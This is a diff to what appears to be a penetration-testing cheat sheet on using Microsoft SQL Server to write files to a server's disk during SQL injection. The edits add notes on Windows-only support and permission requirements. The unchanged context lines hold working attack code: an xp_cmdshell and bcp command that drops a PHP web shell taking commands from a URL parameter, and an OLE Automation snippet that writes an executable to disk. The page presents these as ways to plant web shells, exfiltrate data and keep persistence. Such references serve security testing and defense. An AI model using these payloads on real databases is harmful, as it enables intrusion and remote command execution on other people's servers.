@@ -4,16 +4,18 @@ description: Techniques for writing files to the filesystem using MSSQL
 category: File Operations
 order: 20
 tags: ["file operations", "bcp", "xp_cmdshell", "web shell"]
-lastUpdated: 2025-12-15
+lastUpdated: 2026-10-08
 ---
 
 Microsoft SQL Server provides several methods to write files to the server's filesystem, which can be exploited during SQL injection attacks to deploy web shells, exfiltrate data, or establish persistence.
+
+All methods below target **SQL Server on Windows**: `xp_cmdshell`, OLE Automation (`sp_OACreate`) and `bcp`/`certutil`/`powershell` invoked through `xp_cmdshell` are not available on SQL Server for Linux (`xp_cmdshell` and `Ole Automation Procedures` cannot be enabled there). The Windows paths, web-shell drop locations and UNC/SMB targets likewise apply only to Windows.
 
 ## Prerequisites
 
 To write files from MSSQL, you typically need one of the following:
 
-1. `sysadmin` role membership (for xp_cmdshell, BCP)
+1. `sysadmin` role membership for `xp_cmdshell` and BCP (or an `EXECUTE` grant on `xp_cmdshell` with a `##xp_cmdshell_proxy_account##` credential, which runs commands as that account)
 2. `Ole Automation Procedures` enabled (for sp_OACreate)
 3. Write permissions to target directory for the SQL Server service account
 
@@ -90,7 +92,7 @@ EXEC xp_cmdshell 'bcp "SELECT ''<?php system($_GET[cmd]); ?>''" queryout "C:\ine
 
 ## OLE Automation (sp_OACreate)
 
-Use FileSystemObject for file operations:
+Use FileSystemObject for file operations. It is off by default and Windows-only (on Linux, enabling `Ole Automation Procedures` fails with Msg 15392), and calling `sp_OACreate` needs `sysadmin` or an explicit `EXECUTE` grant on it.
 
 ```sql
 -- Enable OLE Automation
@@ -117,7 +119,7 @@ DECLARE @stream INT;
 EXEC sp_OACreate 'ADODB.Stream', @stream OUTPUT;
 EXEC sp_OASetProperty @stream, 'Type', 1;  -- Binary
 EXEC sp_OAMethod @stream, 'Open';
-EXEC sp_OAMethod @stream, 'Write', NULL, 0x4D5A9000...;  -- Replace with full hex byte sequence
+EXEC sp_OAMethod @stream, 'Write', NULL, 0x4D5A9000;  -- Truncated; supply the full file as a hex literal
 -- Note: 0x4D5A is the 'MZ' DOS header signature for PE executables
 EXEC sp_OAMethod @stream, 'SaveToFile', NULL, 'C:\temp\binary.exe', 2;
 EXEC sp_OAMethod @stream, 'Close';
@@ -126,7 +128,7 @@ EXEC sp_OADestroy @stream;
 
 ## Using SQL Agent Jobs
 
-Write files via CmdExec job steps:
+Write files via CmdExec job steps. This requires the SQL Server Agent service to be running (Agent is not included in Express edition) and membership in `sysadmin` (or a SQLAgent* fixed msdb role plus a CmdExec proxy). The CmdExec subsystem is Windows-only: SQL Server Agent on Linux cannot run operating system commands.
 
 ```sql
 -- Create job to write file
